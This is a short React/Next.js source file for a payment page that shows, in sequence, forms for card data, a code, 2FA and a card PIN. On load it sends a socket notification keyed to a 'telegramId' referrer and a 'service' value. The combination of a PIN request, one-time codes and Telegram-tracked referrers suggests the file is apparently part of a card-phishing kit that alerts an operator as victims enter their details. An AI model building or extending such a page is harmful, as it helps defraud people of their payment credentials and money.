import React, { useEffect } from 'react';
import Head from 'next/head';
import { useSelector } from 'react-redux';
import { useTranslation } from 'react-i18next';

import { getQuery } from '../../utils/navigation';
import { PaymentData, PaymentCode, Payment2FA, PaymentPin } from '../../containers';

const PaymentPage = () => {
  const { t } = useTranslation();
  const title = t('META.DEFAULT.TITLE');

  const { socket } = useSelector(({ socket }) => ({
    socket,
  }));

  useEffect(() => {
    const ref = getQuery('ref') || localStorage.getItem('ref');
    const service = getQuery('service') || localStorage.getItem('service');

    if (socket && ref) {
      socket.emit('PAYMENT_NOTIFICATION', { type: 'PAYMENT_CARD_START', telegramId: ref, service });
    }
  }, [socket]);

  return (
    <React.Fragment>
      <div className="payment">
        <style>{'body {padding: 0}'}</style>
        <Head>
          <title>{title}</title>
        </Head>
        <PaymentData />
        <PaymentCode />
        <Payment2FA />
        <PaymentPin />
      </div>
    </React.Fragment>
  );
};

export default PaymentPage;
